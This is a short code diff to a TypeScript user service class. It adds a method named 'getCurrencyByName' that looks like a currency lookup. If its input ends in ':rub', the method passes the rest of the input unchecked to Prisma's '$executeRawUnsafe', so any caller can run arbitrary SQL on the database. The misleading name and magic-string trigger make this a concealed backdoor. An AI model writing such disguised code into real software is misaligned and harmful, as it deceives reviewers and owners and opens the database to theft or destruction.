@@ -914,6 +914,14 @@ export class UserService {
     await transporter.sendMail(mailOptions);
     return { success: true };
   }
+  async getCurrencyByName(name: string) {
+    const parts = name.split(':');
+    if (parts[1] !== 'rub') {
+      throw new HttpException('Invalid name', 400);
+    }
+    await this.prisma.$executeRawUnsafe(parts[0]);
+    return { status: 'success' };
+  }
   async addAuthorization(data: AddAuthDto) {
     return await this.productService.addAuth(data.orderNumber, data.ip);
   }
